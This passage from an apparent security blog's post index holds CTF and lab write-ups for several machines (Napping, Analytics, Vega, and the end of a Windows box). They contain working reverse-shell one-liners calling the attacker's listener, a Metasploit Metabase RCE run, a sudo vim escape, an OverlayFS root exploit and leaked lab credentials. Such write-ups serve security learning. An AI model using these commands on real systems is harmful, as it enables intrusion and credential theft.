10.0.2.60 2222 -e cmd\"[*] CombaseModule: 0x140703160991744[*] DispatchTable: 0x140703163309296[*] UseProtseqFunction: 0x140703162684576[*] UseProtseqFunctionParamCount: 6[*] HookRPC[*] Start PipeServer[*] CreateNamedPipe \\\\.\\pipe\\c262a646-665f-4513-b85b-927d6bef8214\\pipe\\epmapper[*] Trigger RPCSS[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046[*] DCOM obj IPID: 0000d802-07a0-ffff-197d-514d77326333[*] DCOM obj OXID: 0x1d39742a43aec09b[*] DCOM obj OID: 0x17f6a0d13be13827[*] DCOM obj Flags: 0x281[*] DCOM obj PublicRefs: 0x0[*] Marshal Object bytes len: 100[*] UnMarshal Object[*] Pipe Connected![*] CurrentUser: NT AUTHORITY\\Servicio de red[*] CurrentsImpersonationLevel: Impersonation[*] Start Search System Token[*] PID : 836 Token:0x616 User: NT AUTHORITY\\SYSTEM ImpersonationLevel: Impersonation[*] Find System Token : True[*] UnmarshalObject: 0x80070776[*] CurrentUser: NT AUTHORITY\\SYSTEM[*] process start with pid 1912```{: .nolineno}In response to that I got the shell â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Simple]â””â”€$ nc -lvnp 2222 listening on [any] 2222 ...connect to [10.0.2.60] from (UNKNOWN) [10.0.2.76] 49722Microsoft Windows [Versiï¿½n 10.0.17763.107](c) 2018 Microsoft Corporation. Todos los derechos reservados.c:\\inetpub\\wwwroot>whoamiwhoamint authority\\systemc:\\inetpub\\wwwroot>cd ../../cd ../../c:\\>cd Userscd Usersc:\\Users>dirdir El volumen de la unidad C no tiene etiqueta. El nï¿½mero de serie del volumen es: 26CD-AE41 Directorio de c:\\Users09/10/2023 00:07 .09/10/2023 00:07 ..08/10/2023 21:46 .NET v4.508/10/2023 21:46 .NET v4.5 Classic09/10/2023 00:11 Administrador09/10/2023 00:07 marcos26/09/2023 15:11 Public 0 archivos 0 bytes 7 dirs 45.513.170.944 bytes libresc:\\Users>cd Administradorcd Administradorc:\\Users\\Administrador>dirdir El volumen de la unidad C no tiene etiqueta. El nï¿½mero de serie del volumen es: 26CD-AE41 Directorio de c:\\Users\\Administrador09/10/2023 00:14 .09/10/2023 00:14 ..26/09/2023 15:11 3D Objects26/09/2023 15:11 Contacts26/09/2023 15:11 Desktop08/10/2023 22:50 Documents26/09/2023 15:11 Downloads26/09/2023 15:11 Favorites26/09/2023 15:11 Links26/09/2023 15:11 Music26/09/2023 15:11 Pictures26/09/2023 15:11 Saved Games26/09/2023 15:11 Searches26/09/2023 15:11 Videos 0 archivos 0 bytes 14 dirs 45.513.170.944 bytes libresc:\\Users\\Administrador>cd Desktopcd Desktopc:\\Users\\Administrador\\Desktop>dirdir El volumen de la unidad C no tiene etiqueta. El nï¿½mero de serie del volumen es: 26CD-AE41 Directorio de c:\\Users\\Administrador\\Desktop26/09/2023 15:11 .26/09/2023 15:11 ..09/10/2023 00:07 66 root.txt 1 archivos 66 bytes 2 dirs 45.513.170.944 bytes libresc:\\Users\\Administrador\\Desktop>type root.txttype root.txtFLAGFLAGFLAGFLAGFLAGFLAGc:\\Users\\Administrador\\Desktop>```{: .nolineno}I am Admin Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Napping : 1.0.1", "url": "/posts/Napping-1.0.1/", "categories": "VulnHub", "tags": "PrivEsc, Public Exploit, target='_blank'", "date": "2023-10-25 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸![Untitled](Napping%201%200%201/Untitled%201.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/napping1.0.1]â””â”€$ nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.75Nmap sc...", "content": "## Port Scan Results â¤µï¸![Untitled](Napping%201%200%201/Untitled%201.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/napping1.0.1]â””â”€$ nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.75Nmap scan report for 10.0.2.75Host is up (0.00082s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 24:c4:fc:dc:4b:f4:31:a0:ad:0d:20:61:fd:ca:ab:79 (RSA)| 256 6f:31:b3:e7:7b:aa:22:a2:a7:80:ef:6d:d2:87:6c:be (ECDSA)|_ 256 af:01:85:cf:dd:43:e9:8d:32:50:83:b2:41:ec:1d:3b (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set|_http-title: LoginMAC Address: 08:00:27:49:EE:4D (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸I checked port 80 and got this Login page so lets try to signup first â†’![Untitled](Napping%201%200%201/Untitled%202.png)I used username as `admin` and password as `admin123` â†’![Untitled](Napping%201%200%201/Untitled%203.png)I logged in and I got this url Loaded lets check its source code for more details â†’![Untitled](Napping%201%200%201/Untitled%204.png)> While checking this source code I noticed this target value as _blank and that helps me access the url site as redirect so I searched on internet as got this vulnerability for redirection like this â†’>>[https://medium.com/@jitbit/target-blank-the-most-underestimated-vulnerability-ever-96e328301f4c](https://medium.com/@jitbit/target-blank-the-most-underestimated-vulnerability-ever-96e328301f4c){: .prompt-tip }![Untitled](Napping%201%200%201/Untitled%205.png)So for loading that redirect I created an html file named as index.html and used the javascript function of `window.opener.location` .```htmlâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/napping1.0.1]â””â”€$ cat index.html \t\t\t\t\t\t```{: .nolineno}Now I started the http server through python on port 80 os that the file can be loaded through the machine and also started the lisener on port 9000 so that I could get some ping through admin â†’ ![Untitled](Napping%201%200%201/Untitled%206.png)After some time I get the credentials from admin ping â†’![Untitled](Napping%201%200%201/Untitled%207.png)```bashdaniel : C@ughtm3napping123```{: .nolineno}Lets try SSH now â†’## SSH SHELL â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/napping1.0.1]â””â”€$ ssh daniel@10.0.2.75 The authenticity of host '10.0.2.75 (10.0.2.75)' cant be established.ED25519 key fingerprint is SHA256:81h22zyEZ6ztpKfLu65kzPnsnUUotkuioRYPno8fpN8.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.0.2.75' (ED25519) to the list of known hosts.daniel@10.0.2.75 is password: Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-89-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed Oct 25 14:12:25 UTC 2023 System load: 0.2 Processes: 132 Usage of /: 44.0% of 18.57GB Users logged in: 0 Memory usage: 33% IPv4 address for enp0s3: 10.0.2.75 Swap usage: 0%330 updates can be applied immediately.255 of these updates are standard security updates.To see these additional updates run: apt list --upgradableLast login: Tue Oct 12 00:51:35 2021 from 10.0.2.15daniel@napping:~$ whoamidanieldaniel@napping:~$ iduid=1001(daniel) gid=1001(daniel) groups=1001(daniel),1002(administrators)daniel@napping:~$ sudo -l[sudo] password for daniel: Sorry, user daniel may not run sudo on napping.daniel@napping:~$ ls -altotal 24drwxr-xr-x 3 daniel daniel 4096 Oct 12 2021 .drwxr-xr-x 4 root root 4096 Oct 12 2021 ..lrwxrwxrwx 1 daniel daniel 9 Oct 12 2021 .bash_history -> /dev/null-rw-r--r-- 1 daniel daniel 220 Feb 25 2020 .bash_logout-rw-r--r-- 1 daniel daniel 3771 Feb 25 2020 .bashrcdrwx------ 2 daniel daniel 4096 Oct 12 2021 .cache-rw-r--r-- 1 daniel daniel 807 Feb 25 2020 .profile-rw------- 1 daniel daniel 0 Oct 12 2021 .viminfodaniel@napping:~$```{: .nolineno}I checked another user files â†’```bashdaniel@napping:/home$ ls -altotal 16drwxr-xr-x 4 root root 4096 Oct 12 2021 .drwxr-xr-x 20 root root 4096 Oct 11 2021 ..drwxr-xr-x 3 adrian adrian 4096 Oct 25 05:44 adriandrwxr-xr-x 3 daniel daniel 4096 Oct 12 2021 danieldaniel@napping:/home$ cd adriandaniel@napping:/home/adrian$ ls -altotal 32drwxr-xr-x 3 adrian adrian 4096 Oct 25 05:44 .drwxr-xr-x 4 root root 4096 Oct 12 2021 ..lrwxrwxrwx 1 adrian adrian 9 Oct 12 2021 .bash_history -> /dev/null-rw-r--r-- 1 adrian adrian 0 Feb 25 2020 .bash_logout-rw-r--r-- 1 adrian adrian 0 Feb 25 2020 .bashrcdrwx------ 2 adrian adrian 4096 Oct 11 2021 .cachelrwxrwxrwx 1 adrian adrian 9 Oct 12 2021 .mysql_history -> /dev/null-rw-r--r-- 1 adrian adrian 0 Feb 25 2020 .profile-rw-rw-r-- 1 adrian adrian 75 Oct 11 2021 .selected_editor-rw-r--r-- 1 adrian adrian 0 Oct 11 2021 .sudo_as_admin_successful-rw------- 1 adrian adrian 0 Oct 30 2021 .viminfo-rw-rw-r-- 1 adrian administrators 481 Oct 30 2021 query.py-rw-rw-r-- 1 adrian adrian 8160 Oct 25 14:12 site_status.txt-rw------- 1 adrian adrian 22 Oct 12 2021 user.txt```{: .nolineno}I noticed that I can edit the file query.py as I have the permission as shown through id command â†’```bashdaniel@napping:/home/adrian$ cat query.py from datetime import datetimeimport requestsnow = datetime.now()r = requests.get('http://127.0.0.1/')if r.status_code == 200: f = open(\"site_status.txt\",\"a\") dt_string = now.strftime(\"%d/%m/%Y %H:%M:%S\") f.write(\"Site is Up: \") f.write(dt_string) f.write(\"\\n\") f.close()else: f = open(\"site_status.txt\",\"a\") dt_string = now.strftime(\"%d/%m/%Y %H:%M:%S\") f.write(\"Check Out Site: \") f.write(dt_string) f.write(\"\\n\") f.close()```{: .nolineno}In this file I added the reverse shell command as I notice this file contains commands related to date and time so may be it is executed through cron so I modified it â†’```bashdaniel@napping:/home/adrian$ nano query.py daniel@napping:/home/adrian$ cat query.py from datetime import datetimeimport requestsimport osos.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.60 4444 >/tmp/f')now = datetime.now()r = requests.get('http://127.0.0.1/')if r.status_code == 200: f = open(\"site_status.txt\",\"a\") dt_string = now.strftime(\"%d/%m/%Y %H:%M:%S\") f.write(\"Site is Up: \") f.write(dt_string) f.write(\"\\n\") f.close()else: f = open(\"site_status.txt\",\"a\") dt_string = now.strftime(\"%d/%m/%Y %H:%M:%S\") f.write(\"Check Out Site: \") f.write(dt_string) f.write(\"\\n\") f.close()daniel@napping:/home/adrian$```{: .nolineno}I waited for a minute or so and I got the reveres shell â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/napping1.0.1]â””â”€$ nc -lvnp 4444listening on [any] 4444 ...connect to [10.0.2.60] from (UNKNOWN) [10.0.2.75] 38600/bin/sh: 0: can not access tty; job control turned off$ whoamiadrian$ ls -altotal 36drwxr-xr-x 3 adrian adrian 4096 Oct 25 05:44 .drwxr-xr-x 4 root root 4096 Oct 12 2021 ..lrwxrwxrwx 1 adrian adrian 9 Oct 12 2021 .bash_history -> /dev/null-rw-r--r-- 1 adrian adrian 0 Feb 25 2020 .bash_logout-rw-r--r-- 1 adrian adrian 0 Feb 25 2020 .bashrcdrwx------ 2 adrian adrian 4096 Oct 11 2021 .cachelrwxrwxrwx 1 adrian adrian 9 Oct 12 2021 .mysql_history -> /dev/null-rw-r--r-- 1 adrian adrian 0 Feb 25 2020 .profile-rw-rw-r-- 1 adrian adrian 75 Oct 11 2021 .selected_editor-rw-r--r-- 1 adrian adrian 0 Oct 11 2021 .sudo_as_admin_successful-rw------- 1 adrian adrian 0 Oct 30 2021 .viminfo-rw-rw-r-- 1 adrian administrators 581 Oct 25 14:18 query.py-rw-rw-r-- 1 adrian adrian 8256 Oct 25 14:18 site_status.txt-rw------- 1 adrian adrian 22 Oct 12 2021 user.txt$ iduid=1000(adrian) gid=1000(adrian) groups=1000(adrian),1002(administrators)$ sudo -lMatching Defaults entries for adrian on napping: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser adrian may run the following commands on napping: (root) NOPASSWD: /usr/bin/vim$```{: .nolineno}Now lets use the GTFOBin site to get the root shell and exploit the vim â†’```bashadrian@napping:~$ sudo -u root vim -c ':!/bin/bash'root@napping:/home/adrian#root@napping:/home/adrian# whoamirootroot@napping:/home/adrian# iduid=0(root) gid=0(root) groups=0(root)root@napping:/home/adrian# cd /root@napping:/# cd /rootroot@napping:~# ls -altotal 48drwx------ 5 root root 4096 Oct 30 2021 .drwxr-xr-x 20 root root 4096 Oct 11 2021 ..lrwxrwxrwx 1 root root 9 Oct 12 2021 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrcdrwxr-xr-x 3 root root 4096 Oct 12 2021 .cachelrwxrwxrwx 1 root root 9 Oct 12 2021 .mysql_history -> /dev/null-rw-r--r-- 1 root root 161 Dec 5 2019 .profile-rw-r--r-- 1 root root 75 Oct 19 2021 .selected_editordrwx------ 2 root root 4096 Oct 11 2021 .ssh-rw------- 1 root root 0 Oct 30 2021 .viminfo-rw-r----- 1 root root 224 Oct 19 2021 del_links.py-rw-r----- 1 root root 224 Oct 21 2021 del_users.py-rw-r----- 1 root root 935 Oct 30 2021 nap.py-rw------- 1 root root 41 Oct 12 2021 root.txtdrwxr-xr-x 3 root root 4096 Oct 11 2021 snaproot@napping:~# cat root.txtAdmins just can not stay awake tsk tsk tskroot@napping:~#```{: .nolineno}I am root now !> Key Learning was the vulnerability of `target='_blank'` , that underrated vulnerability.{: .prompt-danger }> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Analytics", "url": "/posts/Analytics/", "categories": "HackTheBox", "tags": "Metasploit, PrivEsc, Public Exploit", "date": "2023-10-25 00:00:00 +0530", "snippet": "## Description â¤µï¸ This is a *Analytics* machine writeup/walkthrough, from HackTheBox platform.This Machine is vulnerable to Metabase version .## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloa...", "content": "## Description â¤µï¸ This is a *Analytics* machine writeup/walkthrough, from HackTheBox platform.This Machine is vulnerable to Metabase version .## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Analytics]â””â”€$ sudo nmap -sC -sV -oN Nmap_results.txt 10.10.11.233 [sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-25 20:38 ISTNmap scan report for analytical.htb (10.10.11.233)Host is up (0.20s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)|_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: AnalyticalService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸Lets check port 80 and I redirected to `analytical.htb` and I set the hosts file and I got this site â†’![Untitled](Analytics/Untitled%201.png)I also got this Login page â†’ `http://data.analytical.htb/` ![Untitled](Analytics/Untitled%202.png)> I then searched related to matabase and I encountered with this vulnerability â†’ [**CVE-2023-38646**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38646){: .prompt-tip }I used it with metasploit like this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Analytics]â””â”€$ msfconsole -q msf6 > search metabaseMatching Modules========= # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/linux/http/metabase_setup_token_rce 2023-07-22 excellent Yes Metabase Setup Token RCEInteract with a module by name or index. For example info 0, use 0 or use exploit/linux/http/metabase_setup_token_rcemsf6 > use 0[*] Using configured payload cmd/unix/reverse_bashmsf6 exploit(linux/http/metabase_setup_token_rce) > optionsModule options (exploit/linux/http/metabase_setup_token_rce): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/usin g-metasploit.html RPORT 3000 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes The URI of the Metabase Application VHOST no HTTP server virtual hostPayload options (cmd/unix/reverse_bash): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 Automatic TargetView the full module info with the info, or info -d command.msf6 exploit(linux/http/metabase_setup_token_rce) > set RHOSTS data.analytical.htbRHOSTS => data.analytics.htbmsf6 exploit(linux/http/metabase_setup_token_rce) > set RPORT 80RPORT => 80msf6 exploit(linux/http/metabase_setup_token_rce) > set LHOST tun0LHOST => 10.10.14.193msf6 exploit(linux/http/metabase_setup_token_rce) > run[*] Started reverse TCP handler on 10.10.14.193:4444 [*] Running automatic check (\"set AutoCheck false\" to disable)[+] The target appears to be vulnerable. Version Detected: 0.46.6[+] Found setup token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f[*] Sending exploit (may take a few seconds)[*] Command shell session 1 opened (10.10.14.193:4444 -> 10.10.11.233:49796) at 2023-10-25 20:37:06 +0530```{: .nolineno}Now I ran the environment variable and got some credentials from it â†’```bash/bin/bash -ibash: cannot set terminal process group (1): Not a ttybash: no job control in this shellb279cd18d8ff:/$b279cd18d8ff:/$ whoamiwhoamimetabaseb279cd18d8ff:/$ ididuid=2000(metabase) gid=2000(metabase) groups=2000(metabase),2000(metabase)b279cd18d8ff:/$b279cd18d8ff:/$ envenvSHELL=/bin/shMB_DB_PASS=HOSTNAME=b279cd18d8ffLANGUAGE=en_US:enMB_JETTY_HOST=0.0.0.0JAVA_HOME=/opt/java/openjdkMB_DB_FILE=//metabase.db/metabase.dbPWD=/LOGNAME=metabaseMB_EMAIL_SMTP_USERNAME=HOME=/home/metabaseLANG=en_US.UTF-8META_USER=metalyticsMETA_PASS=An4lytics_ds20223#MB_EMAIL_SMTP_PASSWORD=USER=metabaseSHLVL=6MB_DB_USER=FC_LANG=en-USLD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../libLC_CTYPE=en_US.UTF-8MB_LDAP_BIND_DN=LC_ALL=en_US.UTF-8MB_LDAP_PASSWORD=PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binMB_DB_CONNECTION_URI=JAVA_VERSION=jdk-11.0.19+7_=/usr/bin/envOLDPWD=/appb279cd18d8ff:/$```{: .nolineno}Now lets have a shell for metanalytics â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Analytics]â””â”€$ ssh metalytics@10.10.11.233The authenticity of host '10.10.11.233 (10.10.11.233)' can not be established.ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.11.233' (ED25519) to the list of known hosts.metalytics@10.10.11.233 is password: Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Fri Oct 27 01:54:16 PM UTC 2023 System load: 0.13525390625 Usage of /: 93.2% of 7.78GB Memory usage: 32% Swap usage: 0% Processes: 160 Users logged in: 1 IPv4 address for docker0: 172.17.0.1 IPv4 address for eth0: 10.10.11.233 IPv6 address for eth0: dead:beef::250:56ff:feb9:300c => / is using 93.2% of 7.78GB * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s just raised the bar for easy, resilient and secure K8s cluster deployment. https://ubuntu.com/engage/secure-kubernetes-at-the-edgeExpanded Security Maintenance for Applications is not enabled.0 updates can be applied immediately.Enable ESM Apps to receive additional future security updates.See https://ubuntu.com/esm or run: sudo pro statusThe list of available updates is more than a week old.To check for new updates run: sudo apt updateFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Fri Oct 27 13:45:02 2023 from 10.10.14.171metalytics@analytics:~$ whoamimetalyticsmetalytics@analytics:~$ iduid=1000(metalytics) gid=1000(metalytics) groups=1000(metalytics)metalytics@analytics:~$ sudo -l[sudo] password for metalytics: Sorry, user metalytics may not run sudo on localhost.metalytics@analytics:~$ ls -altotal 40drwxr-x--- 5 metalytics metalytics 4096 Oct 27 13:47 .drwxr-xr-x 3 root root 4096 Aug 8 11:37 ..lrwxrwxrwx 1 root root 9 Aug 3 16:23 .bash_history -> /dev/null-rw-r--r-- 1 metalytics metalytics 220 Aug 3 08:53 .bash_logout-rw-r--r-- 1 metalytics metalytics 3771 Aug 3 08:53 .bashrcdrwx------ 2 metalytics metalytics 4096 Aug 8 11:37 .cachedrwx------ 3 metalytics metalytics 4096 Oct 27 13:47 .gnupgdrwxrwxr-x 3 metalytics metalytics 4096 Aug 8 11:37 .local-rw-r--r-- 1 metalytics metalytics 807 Aug 3 08:53 .profile-rw-r----- 1 root metalytics 33 Oct 27 13:42 user.txt-rw-r--r-- 1 metalytics metalytics 39 Aug 8 11:30 .vimrcmetalytics@analytics:~$ cat user.txtb4fcaf112c5bd2fae24cb1c1a8b9a62dmetalytics@analytics:~$```{: .nolineno}I searched on web realted to OS version exploit and I got this â†’```bashmetalytics@analytics:~$ cat /etc/*releaseDISTRIB_ID=UbuntuDISTRIB_RELEASE=22.04DISTRIB_CODENAME=jammyDISTRIB_DESCRIPTION=\"Ubuntu 22.04.3 LTS\"PRETTY_NAME=\"Ubuntu 22.04.3 LTS\"NAME=\"Ubuntu\"VERSION_ID=\"22.04\"VERSION=\"22.04.3 LTS (Jammy Jellyfish)\"VERSION_CODENAME=jammyID=ubuntuID_LIKE=debianHOME_URL=\"https://www.ubuntu.com/\"SUPPORT_URL=\"https://help.ubuntu.com/\"BUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\"PRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\"UBUNTU_CODENAME=jammymetalytics@analytics:~$```{: .nolineno}I found 2 CVEs that are **CVE-2023-2640 and CVE-2023-32629** and its details where I tried this exploit :[https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/](https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/)Lets try this exploit â†’```bashmetalytics@analytics:/tmp$ unshare -rm sh -c \"mkdir 1 u w m && cp /u*/b*/p*3 1/; setcap cap_setuid+eip 1/python3;mount -t overlay overlay -o rw,lowerdir=1,upperdir=u,workdir=w, m && touch m/*;\" && u/python3 -c 'import pty; import os;os.setuid(0); pty.spawn(\"/bin/bash\")'root@analytics:/tmp# whoamirootroot@analytics:/tmp# iduid=0(root) gid=1000(metalytics) groups=1000(metalytics)root@analytics:/tmp# cd /rootroot@analytics:/root# ls -altotal 48drwx------ 6 root root 4096 Aug 25 15:14 .drwxr-xr-x 18 root root 4096 Aug 8 11:37 ..lrwxrwxrwx 1 root root 9 Apr 27 2023 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Oct 15 2021 .bashrcdrwx------ 2 root root 4096 Apr 27 2023 .cachedrwxr-xr-x 3 root root 4096 Apr 27 2023 .local-rw-r--r-- 1 root root 161 Jul 9 2019 .profile-rw-r----- 1 root root 33 Oct 27 14:11 root.txtdrwxr-xr-x 2 root root 4096 Aug 25 15:14 .scripts-rw-r--r-- 1 root root 66 Aug 25 15:14 .selected_editordrwx------ 2 root root 4096 Apr 27 2023 .ssh-rw-r--r-- 1 root root 39 Aug 8 11:30 .vimrc-rw-r--r-- 1 root root 165 Aug 8 11:53 .wget-hstsroot@analytics:/root# car root.txtCommand 'car' not found, but can be installed with:apt install ucommon-utilsroot@analytics:/root# cat root.txte89e3986fc936ccca2d00116ce214656root@analytics:/root#```{: .nolineno}I am root now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Vega", "url": "/posts/Vega/", "categories": "PwnTillDawn", "tags": "Password Bruteforce, Hid&Trial, PrivEsc", "date": "2023-10-15 00:00:00 +0530", "snippet": "## Description â¤µï¸ This is a *Hollywood* machine writeup/walkthrough, from PwnTillDawn platform -> https://online.pwntilldawn.com/ with is maintain through wizlynx group -> https://www.wizlynxgroup....", "content": "## Description â¤µï¸ This is a *Hollywood* machine writeup/walkthrough, from PwnTillDawn platform -> https://online.pwntilldawn.com/ with is maintain through wizlynx group -> https://www.wizlynxgroup.com/ .## Port Scan Results â¤µï¸```bash**â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/222]â””â”€$ cat Nmap_results.txt# Nmap 7.94 scan initiated Sun Oct 15 15:37:40 2023 as: nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.150.150.222Nmap scan report for 10.150.150.222Host is up (0.17s latency).Not shown: 65531 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 af:56:59:c5:9a:de:f4:a9:b7:8f:34:4b:a2:21:24:71 (RSA)| 256 1b:e8:16:d4:dc:a6:7a:3e:5d:6f:f2:95:5a:59:08:9a (ECDSA)|_ 256 9c:35:dd:da:ee:a9:b4:0b:55:68:45:fd:8f:85:35:30 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Home Page8089/tcp open ssl/http Splunkd httpd| http-robots.txt: 1 disallowed entry |_/| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser| Not valid before: 2019-10-25T09:19:54|_Not valid after: 2022-10-24T09:19:54|_http-server-header: Splunkd|_http-title: splunkd10000/tcp open http MiniServ 1.941 (Webmin httpd)|_http-title: Site does not have a title (text/html; Charset=iso-8859-1).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel**```{: .nolineno}## Web Enumeration â¤µï¸I started doing directory or files bruteforcing and I got some results from the `/home` directories â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/222]â””â”€$ dirb 'http://10.150.150.222/' -----------------DIRB v2.22 By The Dark Raver-----------------START_TIME: Sun Oct 15 20:55:21 2023URL_BASE: http://10.150.150.222/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612 ---- Scanning URL: http://10.150.150.222/ ----+ http://10.150.150.222/.bash_history (CODE:200|SIZE:2235) + http://10.150.150.222/.bashrc (CODE:200|SIZE:3771) ==> DIRECTORY: http://10.150.150.222/.cache/ + http://10.150.150.222/.profile (CODE:200|SIZE:807) + http://10.150.150.222/0 (CODE:200|SIZE:82726) + http://10.150.150.222/admin (CODE:302|SIZE:0) + http://10.150.150.222/catalog (CODE:302|SIZE:0) + http://10.150.150.222/checkout (CODE:302|SIZE:0) + http://10.150.150.222/cms (CODE:200|SIZE:82740) + http://10.150.150.222/contact (CODE:200|SIZE:28351) + http://10.150.150.222/home (CODE:200|SIZE:80260) + http://10.150.150.222/Home (CODE:301|SIZE:0) + http://10.150.150.222/index.php (CODE:200|SIZE:82738) ^C> Testing: http://10.150.150.222/known_hosts```{: .nolineno}Lets check `.bash_history` here â†’![Untitled](Vega/Untitled%201.png)I got a mysql password and username as â†’```bashvega : puplfiction1994```{: .nolineno}I tried this credentials for SSH login and I got it as wrong credentials and I also I tried to download the file dumpmagento.sql to the system and the file was of 0 bytes â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/222]â””â”€$ ls -al dumpmagento.sql -rw-r--r-- 1 kali kali 0 Oct 17 20:30 dumpmagento.sql```{: .nolineno}>It means that â†’ >>1. If the database is empty thats why it is of 0 bytes or .>2. If the password or the login credentials is wrong that is why.{: .prompt-tip }I checked the site again and I got something related to the password like this â†’![Untitled](Vega/Untitled%202.png)Now I compared it with password and got to know that the bash_history entry is of human error so lets use this password insted â†’ ```bashvega : pulpfiction1994```{: .nolineno}## SSH SHELL â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/222]â””â”€$ ssh vega@10.150.150.222vega@10.150.150.222 is password: Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-66-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue Oct 17 16:24:55 UTC 2023 System load: 0.23 Processes: 186 Usage of /: 43.2% of 19.56GB Users logged in: 1 Memory usage: 21% IP address for ens33: 10.150.150.222 Swap usage: 0% * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch51 packages can be updated.31 updates are security updates.Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Tue Apr 21 10:11:55 2020vega@vega:~$ 